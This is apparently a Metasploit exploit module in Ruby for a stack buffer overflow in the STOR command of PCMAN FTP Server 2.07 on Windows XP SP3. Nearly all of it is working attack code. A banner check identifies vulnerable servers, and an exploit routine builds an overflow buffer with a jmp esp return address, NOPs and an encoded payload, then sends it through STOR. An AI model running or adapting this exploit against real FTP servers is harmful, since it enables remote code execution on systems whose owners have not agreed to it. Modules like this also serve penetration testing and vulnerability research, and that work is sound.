 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
     
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;PCMAN FTP Server STOR Command Stack Overflow&#039;,
            &#039;Description&#039;    => %q{
                        This module exploits a buffer overflow vulnerability
                        found in the STOR command of the PCMAN FTP v2.07 Server
                        when the "/../" parameters are also sent to the server.
            },
            &#039;Author&#039;         => [
                        &#039;Christian (Polunchis) Ramirez&#039;,    # Initial Discovery
                        &#039;Rick (nanotechz9l) Flores&#039;,        # Metasploit Module                             
                    ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/27703/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;         => 1000,
                    &#039;BadChars&#039;      => "\x00\xff\x0a\x0d\x20\x40",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP3&#039;, 
                        { 
                            &#039;Ret&#039; => 0x7C91FCD8, # jmp esp from kernel32.dll
                            &#039;Offset&#039; => 2002
                        } 
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;Jul 17 2011&#039;,
            &#039;DefaultTarget&#039; => 0))
    end
     
    def check
    connect
    disconnect
    if (banner =~ /220 PCMan&#039;s FTP Server 2.0/)
        return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end
 
    def exploit
        connect_login
        print_status("Trying victim #{target.name}...")     
        sploit = "\x41" * 2002 + [target.ret].pack(&#039;V&#039;) + make_nops(4) + "\x83\xc4\x9c" + payload.encoded
        sploit << make_nops(4)
        sploit << payload.encoded
        send_cmd( [&#039;STOR&#039;, &#039;/../&#039; + sploit], false )
        handler
        disconnect
    end
end

